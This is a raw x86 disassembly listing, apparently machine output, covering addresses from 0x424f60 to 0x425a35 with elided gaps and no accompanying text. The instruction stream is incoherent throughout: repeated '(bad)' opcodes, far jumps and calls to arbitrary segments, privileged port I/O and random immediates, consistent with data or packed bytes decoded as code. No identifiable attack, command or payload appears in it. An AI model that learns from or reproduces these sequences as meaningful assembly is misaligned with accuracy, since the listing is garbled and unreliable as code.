  424f60:	mov    edx,0x9dea4409
  424f65:	aaa    
  424f66:	rcr    BYTE PTR [edi],cl
  424f68:	adc    al,0x1c
  424f6a:	aad    0xd5
  424f6c:	cmp    eax,0x8d6bb999
  424f71:	enter  0x990d,0x0
  424f75:	push   ds
  424f76:	sbb    edi,DWORD PTR [ebp+edx*4-0x4e]
  424f7a:	mov    ch,0x79
  424f7c:	xor    cl,BYTE PTR [eax-0x4a9c847c]
  424f82:	mov    dl,0xb6
  424f84:	jp     0x424fe6
  424f86:	leave  
  424f87:	inc    eax
  424f88:	aas    
  424f89:	add    edx,DWORD PTR [esi+0xb8ea6e0]
  424f8f:	es aas 
  424f91:	call   0xd721:0xc4f792b0
  424f98:	and    BYTE PTR [ecx+edx*4-0x11a01914],0x59
  424fa0:	dec    esp
  424fa1:	scas   eax,DWORD PTR es:[edi]
  424fa2:	mov    bl,0xcf
  424fa4:	repz xor ebp,esp
  424fa7:	daa    
  424fa8:	jo     0x424ffe
  424faa:	xchg   esi,eax
  424fab:	cmp    cl,dl
  424fad:	shr    ecx,0x3f
  424fb0:	pusha  
  424fb1:	repnz aad 0x9
  424fb4:	jne    0x424f60
  424fb6:	aas    
  424fb7:	lds    ebx,FWORD PTR [ebx-0x6]
  424fba:	xor    al,0x86
  424fbc:	out    dx,eax
  424fbd:	mov    WORD PTR [edx],?
  424fbf:	(bad)  
  424fc0:	jmp    0x0:0x0
	...
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	imul   esi,DWORD PTR [ebp-0x75d72f79],0xf50001
  42504a:	add    BYTE PTR [eax],al
  42504c:	shl    DWORD PTR [edx],cl
  42504e:	and    edi,DWORD PTR [esi+0x4e]
  425051:	retf   0x2bcb
  425054:	call   0xcc4ebd88
  425059:	pop    ebp
  42505a:	cmovbe esp,DWORD PTR [esi+0x66]
  42505e:	add    BYTE PTR [ebp-0x17],cl
  425061:	jecxz  0x42509f
  425063:	jns    0x4250d2
  425065:	fst    DWORD PTR ds:0x596d2dcc
  42506b:	cmovg  ecx,ebp
  42506e:	sub    ebx,DWORD PTR [eax]
  425070:	add    ebx,DWORD PTR [ebp+0x30]
  425073:	or     eax,0xe872a43d
  425078:	xor    DWORD PTR [edx+0x3d],eax
  42507b:	inc    edi
  42507c:	mov    cl,bh
  42507e:	outs   dx,BYTE PTR ds:[esi]
  42507f:	je     0x42508b
  425081:	jbe    0x42500c
  425083:	cld    
  425084:	rcl    DWORD PTR [esi-0x1c],1
  425087:	loope  0x4250e6
  425089:	int3   
  42508a:	jge    0x4250a7
  42508c:	retf   
  42508d:	(bad)  
  42508e:	fst    QWORD PTR [ebx+edx*1+0x74]
  425092:	mov    ebx,DWORD PTR [ebp+0x4f63c02e]
  425098:	mov    ds:0x9e26f115,eax
  42509d:	aam    0x1a
  42509f:	out    0xb7,al
  4250a1:	mov    ds:0xa658c3c4,al
  4250a6:	xchg   edi,eax
  4250a7:	inc    ebp
  4250a8:	das    
  4250a9:	cwde   
  4250aa:	push   eax
  4250ab:	adc    eax,0xf1199317
  4250b0:	sub    ebx,DWORD PTR [ecx+0x5dc1035]
  4250b6:	rcr    DWORD PTR [edx+0x3],0x38
  4250ba:	iret   
  4250bb:	inc    eax
  4250bc:	test   edi,0xa400cca3
  4250c2:	pop    esp
  4250c3:	mov    esi,0x9c69a2a3
  4250c8:	pop    ds
  4250c9:	or     cl,BYTE PTR [edx]
  4250cb:	xchg   ecx,eax
  4250cc:	mov    ch,0x7b
  4250ce:	jmp    0x4601:0xc81dbc60
  4250d5:	sub    ebx,DWORD PTR [ebx]
  4250d7:	add    ebx,eax
  4250d9:	(bad)  
  4250da:	popa   
  4250db:	iret   
  4250dc:	cli    
  4250dd:	inc    eax
  4250de:	and    al,0x20
  4250e0:	mov    ds:0x1f249c13,eax
  4250e5:	push   0x6ce0cacb
  4250ea:	mov    BYTE PTR [edi-0x73],0x72
  4250ee:	mov    bh,bl
  4250f0:	adc    al,0xf9
  4250f2:	sar    BYTE PTR [ebp+0x0],cl
  4250f5:	enter  0xc0f8,0xf
  4250f9:	lock add DWORD PTR [edx+ebp*4],esp
  4250fd:	sbb    eax,0x43ead85c
  425102:	sub    ecx,DWORD PTR cs:[edx-0x4b1c45c6]
  425109:	es push ebp
  42510b:	lock ss jb 0x42515c
  42510f:	ja     0x425096
  425111:	adc    ebp,DWORD PTR [edi-0x2a]
  425114:	mov    cl,0x77
  425116:	(bad)  
  425117:	adc    al,0x8e
  425119:	sub    eax,0xc06b1c89
  42511e:	push   ds
  42511f:	dec    eax
  425120:	xor    edx,ebp
  425122:	mov    edx,0x59865d09
  425127:	pusha  
  425128:	cs jecxz 0x42518b
  42512b:	mov    fs,WORD PTR [edi]
  42512d:	or     eax,0x187518cd
  425132:	enter  0xdbc,0xa3
  425136:	mov    al,ds:0xb3127411
  42513b:	push   cs
  42513c:	xor    eax,0x67f4717b
	...
  4251b1:	add    BYTE PTR [eax],al
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251c1:	stc    
  4251c2:	push   ss
  4251c3:	jg     0x4251e2
  4251c5:	mov    eax,DWORD PTR [ecx]
  4251c7:	add    ch,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    dh,al
  4251cd:	pusha  
  4251ce:	fdiv   DWORD PTR [ebx]
  4251d0:	in     eax,dx
  4251d1:	imul   esi,DWORD PTR [eax+eax*2],0x1f
  4251d5:	inc    edi
  4251d6:	mov    al,0x65
  4251d8:	bound  ecx,QWORD PTR [ebp+0x2a]
  4251db:	pop    esi
  4251dc:	loope  0x4251cb
  4251de:	(bad)  
  4251df:	mov    ecx,0x19de0e6f
  4251e4:	out    dx,al
  4251e5:	outs   dx,BYTE PTR ds:[esi]
  4251e6:	stc    
  4251e7:	rcl    BYTE PTR [eax+eax*4+0x22934b8],0x84
  4251ef:	cmp    dh,BYTE PTR [ebx]
  4251f1:	mov    al,ds:0xefb6a465
  4251f6:	sti    
  4251f7:	dec    edi
  4251f8:	cmp    BYTE PTR [esi+ebx*4-0x42],dl
  4251fc:	imul   esp,DWORD PTR [edx],0xffffff9b
  4251ff:	xchg   ecx,eax
  425200:	or     DWORD PTR [ebp+0x10124492],0xffffffb2
  425207:	in     eax,0x49
  425209:	cmp    esp,edi
  42520b:	repz mov ebx,0x9ce7a1ea
  425211:	jae    0x425236
  425213:	shl    edx,1
  425215:	xor    DWORD PTR [ecx],edx
  425217:	or     BYTE PTR [edi+0x65],cl
  42521a:	pop    ds
  42521b:	add    bl,dh
  42521d:	inc    ecx
  42521e:	inc    ebp
  42521f:	add    eax,ebp
  425221:	inc    edi
  425222:	and    al,0x9b
  425224:	push   esp
  425225:	and    ch,BYTE PTR [edx]
  425227:	cmc    
  425228:	sub    edi,0x13964a34
  42522e:	lahf   
  42522f:	fwait
  425230:	dec    edx
  425231:	(bad)  
  425232:	mov    ds:0x8eb57662,eax
  425237:	jge    0x42528d
  425239:	out    dx,al
  42523a:	enter  0x10ac,0xf4
  42523e:	or     edi,DWORD PTR [edx]
  425240:	jns    0x4251e3
  425242:	inc    esi
  425243:	mov    ds:0xc9870bac,al
  425248:	jbe    0x4252c4
  42524a:	iret   
  42524b:	daa    
  42524c:	hlt    
  42524d:	jge    0x42529c
  42524f:	fmul   QWORD PTR [esp+edx*8]
  425252:	mov    ebp,0xe64f9bb8
  425257:	hlt    
  425258:	or     DWORD PTR [esi-0x7a],edi
  42525b:	jns    0x42521f
  42525d:	or     al,0xfd
  42525f:	addr16 pushf 
  425261:	sub    DWORD PTR [edi],ecx
  425263:	loope  0x4252a5
  425265:	xchg   edx,eax
  425266:	mov    dl,0xbf
  425268:	ficomp DWORD PTR [edi]
  42526a:	jnp    0x42523e
  42526c:	mov    esi,0xe66f8d8c
  425271:	mov    ah,0xbe
  425273:	lds    edi,FWORD PTR [ecx+0x5e]
  425276:	mov    bl,0x29
  425278:	mov    ebp,0x4f5a7424
  42527d:	addr16 ja 0x4252fa
  425280:	(bad)  
  425281:	cmp    BYTE PTR [ecx-0x6d5fa87a],al
  425287:	inc    esi
  425288:	jo     0x42524f
  42528a:	lahf   
  42528b:	mov    dl,0x70
  42528d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42528e:	inc    esi
  42528f:	mov    bh,0x84
  425291:	cwde   
  425292:	in     al,0xe5
  425294:	push   esi
  425295:	push   esi
  425296:	pop    ebp
  425297:	or     dh,BYTE PTR [ecx-0x3a]
  42529a:	jge    0x4252bf
  42529c:	adc    ebx,esi
  42529e:	js     0x42531e
  4252a0:	fucomp st(6)
  4252a2:	cli    
  4252a3:	out    dx,al
  4252a4:	adc    BYTE PTR [ecx+0x45],dl
  4252a7:	popf   
  4252a8:	or     ch,0xc6
  4252ab:	test   al,0xfb
  4252ad:	das    
  4252ae:	or     esi,ecx
  4252b0:	test   al,0x15
  4252b2:	outs   dx,DWORD PTR ds:[esi]
  4252b3:	ror    BYTE PTR [esi],1
  4252b5:	(bad)  [esp+eax*8+0x54e15747]
  4252bc:	inc    ebx
  4252bd:	push   ss
  4252be:	pushf  
  4252bf:	mov    dh,0x44
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz pop esi
  425341:	arpl   WORD PTR [ecx],bp
  425343:	sbb    DWORD PTR [edx],edx
  425345:	mov    WORD PTR [ecx],es
  425347:	add    ch,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [esp+esi*4],dh
  42534e:	(bad)  
  42534f:	hlt    
  425350:	mov    esi,0x61ad083f
  425355:	jl     0x425329
  425357:	std    
  425358:	sbb    BYTE PTR [edx+0xb],dl
  42535b:	cmp    BYTE PTR [ebp-0x30449bd6],dh
  425361:	data16 fidiv WORD PTR [edi]
  425364:	or     DWORD PTR [edx-0x4e],edi
  425367:	aad    0x6f
  425369:	loopne 0x425304
  42536b:	sub    edi,esp
  42536d:	and    ebx,DWORD PTR [eax+0x560e447d]
  425373:	(bad)  
  425374:	cld    
  425375:	mov    edi,0x708f2bdb
  42537a:	mov    esp,0x4d299d2e
  42537f:	mov    bh,0xfc
  425381:	pop    ebx
  425382:	add    eax,edx
  425384:	sub    DWORD PTR [eax-0x73a01d2b],0x37
  42538b:	jnp    0x4253cb
  42538d:	dec    esi
  42538e:	repz push ss
  425390:	jns    0x425330
  425392:	mov    edx,0x49e38f7c
  425397:	jmp    0x425371
  425399:	fnstcw WORD PTR [edi+ebp*8]
  42539c:	sbb    cl,BYTE PTR [ebp-0x6f61f74c]
  4253a2:	and    eax,0x53e39660
  4253a7:	in     al,dx
  4253a8:	add    al,0x50
  4253aa:	jecxz  0x4253ad
  4253ac:	(bad)  
  4253ad:	fcomp  DWORD PTR [edx-0x7f]
  4253b0:	fwait
  4253b1:	call   0x13b1e9d8
  4253b6:	stos   BYTE PTR es:[edi],al
  4253b7:	test   BYTE PTR [eax-0x6b67a312],bl
  4253bd:	push   esp
  4253be:	mov    edi,DWORD PTR [edi+0x77deb261]
  4253c4:	loope  0x425408
  4253c6:	mov    cl,0x54
  4253c8:	retf   
  4253c9:	lds    edx,FWORD PTR [ebx+0xd]
  4253cc:	out    0xd2,al
  4253ce:	cmp    dl,cl
  4253d0:	mov    dl,0x44
  4253d2:	sub    eax,0x9625bec3
  4253d7:	push   ebx
  4253d8:	xchg   BYTE PTR [edi-0x6e],dl
  4253db:	xor    esp,esp
  4253dd:	jge    0x425378
  4253df:	dec    edx
  4253e0:	(bad)  
  4253e1:	shr    BYTE PTR [eax-0x6],1
  4253e4:	(bad)  
  4253e5:	scas   eax,DWORD PTR es:[edi]
  4253e6:	repz shl bh,cl
  4253e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ea:	jae    0x42539d
  4253ec:	or     al,0x8b
  4253ee:	les    eax,FWORD PTR [esi+0xebce31e]
  4253f4:	hlt    
  4253f5:	and    al,0x2d
  4253f7:	dec    esp
  4253f8:	fsub   QWORD PTR [edi]
  4253fa:	aad    0xf9
  4253fc:	test   eax,0x480bf567
  425401:	popa   
  425402:	mov    al,0x19
  425404:	dec    edx
  425405:	and    esp,eax
  425407:	aad    0xf3
  425409:	paddsw mm2,QWORD PTR [ecx-0x4eb125d4]
  425410:	cmc    
  425411:	ds jae 0x425463
  425414:	add    eax,0x415233cb
  425419:	mov    al,ds:0x1aab9224
  42541e:	fidivr WORD PTR [eax]
  425420:	lods   eax,DWORD PTR ds:[esi]
  425421:	sbb    DWORD PTR [edx-0x4d11da86],esi
  425427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425428:	in     eax,0x49
  42542a:	pop    ss
  42542b:	shl    DWORD PTR [eax-0x2cb82f93],cl
  425431:	sbb    DWORD PTR [esi+0x38],ecx
  425434:	mov    ch,0x17
  425436:	hlt    
  425437:	or     eax,0xc420650c
  42543c:	adc    DWORD PTR [edi+eiz*2+0x53],0xffffffd6
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	cs and eax,0x8d07f10a
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	cmc    
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [esi-0x3f],dl
  4254ce:	retf   0xb53b
  4254d1:	(bad)  
  4254d2:	cmp    BYTE PTR ds:0x42207544,cl
  4254d8:	fcomp  QWORD PTR [ebp+0xf]
  4254db:	pop    ebp
  4254dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254dd:	jne    0x42549e
  4254df:	sar    BYTE PTR [ebx],1
  4254e1:	js     0x425506
  4254e3:	and    eax,0x91c5e4b4
  4254e8:	cmp    ebx,esp
  4254ea:	or     ebx,DWORD PTR [edx+ebx*2]
  4254ed:	jge    0x4254df
  4254ef:	daa    
  4254f0:	or     eax,DWORD PTR [edi-0x7e177a48]
  4254f6:	pop    esp
  4254f7:	loop   0x425556
  4254f9:	js     0x42554c
  4254fb:	cwde   
  4254fc:	rol    ebp,1
  4254fe:	push   ebx
  4254ff:	or     eax,DWORD PTR [ecx+0x11]
  425502:	loopne 0x425498
  425504:	adc    eax,0xf683c15b
  425509:	jo     0x42551f
  42550b:	test   BYTE PTR ds:0x35b31ad,bh
  425511:	out    0xe1,al
  425513:	retf   
  425514:	ret    
  425515:	ss sahf 
  425517:	aaa    
  425518:	xchg   ecx,eax
  425519:	sbb    BYTE PTR [ebp+0x41d33223],al
  42551f:	jg     0x425521
  425521:	sub    DWORD PTR ds:[ebx-0x29105c02],ebx
  425528:	mov    ebp,0xc1ce3eda
  42552d:	mov    al,0x8c
  42552f:	sbb    DWORD PTR [esi-0x46d87e10],0x5c478d1b
  425539:	jae    0x425552
  42553b:	cmp    ah,BYTE PTR [eax+0x37c39065]
  425541:	push   0xffffffe4
  425543:	inc    edx
  425544:	dec    ebp
  425545:	imul   esi,DWORD PTR [ebx],0x27d27636
  42554b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42554c:	(bad)  
  42554d:	and    BYTE PTR [edi-0x7905a8b2],dh
  425553:	dec    ebx
  425554:	push   ds
  425555:	stos   BYTE PTR es:[edi],al
  425556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425557:	cmp    al,0xc1
  425559:	pop    edx
  42555a:	jno    0x4255af
  42555c:	mov    ds:0xf79dbfa5,al
  425561:	shl    BYTE PTR [esp+ebx*4-0xb],0xb6
  425566:	xchg   ebp,eax
  425567:	mov    ah,0xc3
  425569:	add    ecx,DWORD PTR [ebx-0x42]
  42556c:	add    DWORD PTR [ecx+0x35643c87],ebp
  425572:	push   ebx
  425573:	jns    0x4255a9
  425575:	dec    eax
  425576:	push   ds
  425577:	(bad)  
  425578:	mov    dl,0xd2
  42557a:	sahf   
  42557b:	lds    edi,FWORD PTR [edx]
  42557d:	dec    eax
  42557e:	and    eax,0xd3d769a
  425583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425584:	fidivr WORD PTR [edx]
  425586:	or     DWORD PTR [edi],esp
  425588:	jmp    0x4773a00a
  42558d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42558e:	or     cl,bl
  425590:	add    ah,BYTE PTR [ebx+0x3bf2640e]
  425596:	(bad)  
  425597:	jo     0x4255c0
  425599:	cmp    al,0x35
  42559b:	xlat   BYTE PTR ds:[ebx]
  42559c:	adc    eax,0x904cd27b
  4255a1:	mov    al,0x80
  4255a3:	enter  0xaabc,0x18
  4255a7:	jecxz  0x4255a0
  4255a9:	and    ch,0x31
  4255ac:	std    
  4255ad:	aaa    
  4255ae:	mov    esi,0xf6a1e1dc
  4255b3:	gs mov esi,0xfdf639e1
  4255b9:	outs   dx,DWORD PTR ds:[esi]
  4255ba:	cmp    eax,0x29c13cea
  4255bf:	icebp  
  4255c0:	add    BYTE PTR es:[eax],al
	...
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	inc    ebx
  425641:	xchg   ebx,eax
  425642:	push   esp
  425643:	xor    bh,ah
  425645:	lea    eax,[ecx]
  425647:	add    ch,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [esi-0x45e54d02],cl
  425651:	retf   
  425652:	sbb    eax,0x1c2d3dba
  425657:	inc    edx
  425658:	adc    esp,esi
  42565a:	(bad)  
  42565b:	jb     0x4256b9
  42565d:	sahf   
  42565e:	fimul  DWORD PTR [edi-0x3f124033]
  425664:	mov    edx,0x7d8a4228
  425669:	inc    esp
  42566a:	leave  
  42566b:	stos   BYTE PTR es:[edi],al
  42566c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42566d:	xchg   DWORD PTR ds:0x53efb61,ecx
  425673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425674:	cs ret 0x3771
  425678:	aaa    
  425679:	xlat   BYTE PTR ds:[ebx]
  42567a:	adc    eax,0x59b24a8d
  42567f:	sub    BYTE PTR [eax+0x6b1bd3ff],0x6c
  425686:	test   eax,0x3c1e202f
  42568b:	in     al,0x5e
  42568d:	(bad)  
  42568e:	jno    0x42567b
  425690:	or     dh,BYTE PTR ds:0x7682ed56
  425696:	dec    eax
  425697:	xlat   BYTE PTR ds:[ebx]
  425698:	mov    ds,WORD PTR [edx+0x6f2660ac]
  42569e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42569f:	dec    edi
  4256a0:	xor    eax,0x7299500b
  4256a5:	loop   0x4256f1
  4256a7:	aaa    
  4256a8:	or     edi,DWORD PTR [ecx+0x2a]
  4256ab:	mov    esi,0xaad5d28e
  4256b0:	jns    0x4256c2
  4256b2:	(bad)  
  4256b3:	stc    
  4256b4:	loope  0x42563f
  4256b6:	not    DWORD PTR [ebx-0x29325b52]
  4256bc:	adc    al,0xe1
  4256be:	cld    
  4256bf:	call   0xfdd:0x438bc89e
  4256c6:	xchg   ebp,eax
  4256c7:	hlt    
  4256c8:	test   DWORD PTR [edx+esi*4-0x6f],esp
  4256cc:	xchg   DWORD PTR [ecx],ecx
  4256ce:	xchg   ebp,eax
  4256cf:	and    DWORD PTR [ecx-0x241097d4],esi
  4256d5:	cli    
  4256d6:	sar    BYTE PTR [ebx+0x25],cl
  4256d9:	aas    
  4256da:	pop    es
  4256db:	cmp    al,0x36
  4256dd:	sar    esp,cl
  4256df:	push   cs
  4256e0:	sbb    al,0x0
  4256e2:	hlt    
  4256e3:	add    DWORD PTR [ecx+esi*4-0x7a915a81],esi
  4256ea:	xchg   esp,eax
  4256eb:	push   edi
  4256ec:	retf   
  4256ed:	add    eax,0xa718f15b
  4256f2:	push   0xcbb3cec0
  4256f7:	push   ecx
  4256f8:	or     eax,0x5c86b16b
  4256fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256fe:	fcmovnb st,st(5)
  425700:	js     0x4256c7
  425702:	pop    ss
  425703:	pushf  
  425704:	es lock jge 0x4256d5
  425708:	int3   
  425709:	dec    esi
  42570a:	mov    DWORD PTR [ecx-0x205b5eab],ecx
  425710:	imul   dh
  425712:	cmp    DWORD PTR [ebx+0x13],0x73715792
  425719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42571a:	cmp    eax,0x88fb731d
  42571f:	dec    ebp
  425720:	sbb    al,0x65
  425722:	sub    eax,0xc6a2806b
  425727:	cdq    
  425728:	das    
  425729:	mov    ebp,0xb4b8441b
  42572e:	idiv   BYTE PTR [edi]
  425730:	lahf   
  425731:	movq   mm4,mm2
  425734:	mov    al,ds:0x8b81d7a1
  425739:	lds    esp,FWORD PTR [ebx+ebp*1+0x39]
  42573d:	add    eax,0x9d1288
	...
  4257b2:	add    BYTE PTR [eax],al
  4257b4:	and    bl,BYTE PTR [eax-0x7c]
  4257b7:	out    dx,eax
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	adc    ebx,esp
  4257c2:	ror    BYTE PTR [esi+0x18ef1],0xf5
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [edx-0x24407c51],cl
  4257d1:	cmp    ch,BYTE PTR [ebx+esi*4]
  4257d4:	test   BYTE PTR [eax-0x67],dl
  4257d7:	sti    
  4257d8:	push   ebp
  4257d9:	cwde   
  4257da:	push   ebp
  4257db:	in     al,0xaf
  4257dd:	daa    
  4257de:	sbb    al,0xfc
  4257e0:	mov    bl,0x18
  4257e2:	cmp    BYTE PTR [ecx+0x33c0ef7c],bl
  4257e8:	popa   
  4257e9:	jmp    0x5828:0x8ab9f33
  4257f0:	push   esi
  4257f1:	jle    0x4257a2
  4257f3:	lods   eax,DWORD PTR ds:[esi]
  4257f4:	pop    ebx
  4257f5:	ins    BYTE PTR es:[edi],dx
  4257f6:	mov    gs,esi
  4257f8:	inc    esp
  4257f9:	mov    ah,0x9b
  4257fb:	enter  0x9007,0xca
  4257ff:	adc    eax,0x8b3a9460
  425804:	retf   
  425805:	or     DWORD PTR [ecx+0x65153f91],edi
  42580b:	int3   
  42580c:	outs   dx,BYTE PTR ds:[esi]
  42580d:	add    dh,BYTE PTR [edi+0x68]
  425810:	lods   al,BYTE PTR ds:[esi]
  425811:	sub    eax,0x8e4c0d76
  425816:	in     al,dx
  425817:	ret    0x4418
  42581a:	clc    
  42581b:	or     eax,0x5ba3ca02
  425820:	pop    ds
  425821:	mov    cl,0x7b
  425823:	inc    esi
  425824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425825:	and    bh,al
  425827:	scas   eax,DWORD PTR es:[edi]
  425828:	xchg   edi,eax
  425829:	jns    0x425800
  42582b:	sub    BYTE PTR [ebp-0x72],al
  42582e:	mov    ds:0x69b990b6,eax
  425833:	out    0x44,eax
  425835:	lds    edi,FWORD PTR [ecx+eiz*8]
  425838:	pop    ebp
  425839:	jecxz  0x42580d
  42583b:	mov    esi,0x2bae3e15
  425840:	sbb    al,BYTE PTR [edi]
  425842:	mov    cl,0xda
  425844:	xor    BYTE PTR [edi+0x21],0xbc
  425848:	push   esi
  425849:	stos   DWORD PTR es:[edi],eax
  42584a:	pop    esi
  42584b:	pop    ebp
  42584c:	or     bh,BYTE PTR ds:0x15821fa3
  425852:	jo     0x4257de
  425854:	cmp    dl,BYTE PTR [edi+0x1393ebef]
  42585a:	loopne 0x42580b
  42585c:	popa   
  42585d:	scas   al,BYTE PTR es:[edi]
  42585e:	out    dx,al
  42585f:	pop    ebx
  425860:	enter  0xd794,0xf7
  425864:	mov    edx,0x9de35b69
  425869:	or     al,0xa3
  42586b:	ret    
  42586c:	mov    ?,WORD PTR [edi-0x5a]
  42586f:	dec    dx
  425871:	lds    ebx,FWORD PTR [edx+0x6604edf2]
  425877:	cld    
  425878:	shr    DWORD PTR [esi-0x50ca23f9],1
  42587e:	loope  0x425898
  425880:	mov    ecx,0x46140e4b
  425885:	mov    dh,0x9
  425887:	aas    
  425888:	dec    edi
  425889:	sahf   
  42588a:	pushf  
  42588b:	sbb    eax,0x1a036267
  425890:	mov    esp,0x50790212
  425895:	sub    DWORD PTR [edx-0x6c],0xb87f15a7
  42589c:	fs lahf 
  42589e:	dec    edx
  42589f:	inc    esp
  4258a0:	push   ss
  4258a1:	mov    fs,WORD PTR [ebp+0x3f]
  4258a4:	inc    DWORD PTR [ebx]
  4258a6:	sbb    bl,cl
  4258a8:	jecxz  0x425831
  4258aa:	out    dx,al
  4258ab:	jns    0x425913
  4258ad:	gs mov cl,0x23
  4258b0:	(bad)  
  4258b1:	jns    0x425884
  4258b3:	arpl   sp,cx
  4258b5:	dec    edi
  4258b6:	in     al,dx
  4258b7:	aaa    
  4258b8:	les    esi,FWORD PTR [edx]
  4258ba:	fsub   QWORD PTR [ebx]
  4258bc:	pop    edi
  4258bd:	in     al,dx
  4258be:	mov    ds:0x24aa,al
	...
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	xchg   DWORD PTR [ebx-0x7019193c],esi
  425946:	add    DWORD PTR [eax],eax
  425948:	cmc    
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [esi-0x68776a0],bl
  425951:	push   eax
  425952:	js     0x42597e
  425954:	in     al,dx
  425955:	shl    BYTE PTR [ecx-0x3354a469],1
  42595b:	mov    bh,0xe9
  42595d:	scas   eax,DWORD PTR es:[edi]
  42595e:	icebp  
  42595f:	cmp    BYTE PTR [eax-0x51],dh
  425962:	inc    eax
  425963:	lods   eax,DWORD PTR ds:[esi]
  425964:	repnz fs mov edx,0xae28346
  42596b:	dec    eax
  42596c:	xor    dl,BYTE PTR [ecx-0x50]
  42596f:	dec    ebx
  425970:	nop
  425971:	add    BYTE PTR [ecx-0x7],ah
  425974:	or     edi,esi
  425976:	jmp    0x24c2:0x9492556a
  42597d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42597e:	rol    DWORD PTR [ebx+0xc],1
  425981:	jge    0x4259ad
  425983:	loopne 0x425995
  425985:	add    ah,bl
  425987:	cld    
  425988:	pop    ecx
  425989:	leave  
  42598a:	mov    ah,BYTE PTR [ecx+0x161d7ca6]
  425990:	pop    edi
  425991:	inc    edi
  425992:	pop    edx
  425993:	xor    BYTE PTR [ebx+0x156efece],0xd0
  42599a:	iret   
  42599b:	cmp    al,0x28
  42599d:	xchg   ebp,eax
  42599e:	in     al,0x32
  4259a0:	cli    
  4259a1:	or     cl,bh
  4259a3:	leave  
  4259a4:	mov    al,0x9d
  4259a6:	out    dx,al
  4259a7:	inc    eax
  4259a8:	fld    QWORD PTR [ecx]
  4259aa:	xchg   ebx,eax
  4259ab:	repnz push esi
  4259ad:	inc    edx
  4259ae:	scas   al,BYTE PTR es:[edi]
  4259af:	add    BYTE PTR [ebx+0x3c],cl
  4259b2:	in     eax,dx
  4259b3:	add    al,0x2
  4259b5:	iret   
  4259b6:	jecxz  0x4259d0
  4259b8:	sbb    BYTE PTR [esi-0x6b],0x39
  4259bc:	nop
  4259bd:	fnstsw WORD PTR [ecx]
  4259bf:	xor    al,BYTE PTR [eax-0x3dc83782]
  4259c5:	mov    ebx,0xe6875b2
  4259ca:	sbb    eax,0x362aba50
  4259cf:	pop    esp
  4259d0:	inc    edx
  4259d1:	mov    DWORD PTR [ebx],ecx
  4259d3:	jo     0x425a4e
  4259d5:	ret    0x4298
  4259d8:	dec    edx
  4259d9:	aaa    
  4259da:	into   
  4259db:	stos   BYTE PTR es:[edi],al
  4259dc:	and    esi,DWORD PTR [esi+esi*8]
  4259df:	sub    eax,0xff3a8c50
  4259e4:	inc    esp
  4259e5:	lds    edi,FWORD PTR [esi]
  4259e7:	or     eax,0xa4b6f120
  4259ec:	lds    edi,FWORD PTR ds:0x53683191
  4259f2:	adc    al,0x9
  4259f4:	mov    ebx,0xbb088c7
  4259f9:	and    ebx,DWORD PTR [ecx+0x4f17338]
  4259ff:	scas   al,BYTE PTR es:[edi]
  425a00:	ud0    ebx,DWORD PTR [esi+edx*4-0x4c]
  425a05:	lds    esp,FWORD PTR [edi-0x3bae60ff]
  425a0b:	(bad)  
  425a0c:	lahf   
  425a0d:	sub    bh,BYTE PTR [esi]
  425a0f:	push   0xf1f7387d
  425a14:	adc    eax,0x2010dccc
  425a19:	mov    bh,0x43
  425a1b:	mov    bl,0x81
  425a1d:	xor    DWORD PTR [esp+ecx*2+0x45],esi
  425a21:	xchg   esi,eax
  425a22:	mov    al,0x9d
  425a24:	push   edi
  425a25:	in     al,dx
  425a26:	push   es
  425a27:	pop    esp
  425a28:	imul   ebp,ebx,0xdd03e8c9
  425a2e:	adc    BYTE PTR [edx+0x71],bh
  425a31:	pop    ecx
  425a32:	popa   
  425a33:	ret    
  425a34:	dec    eax
  425a35:	das    
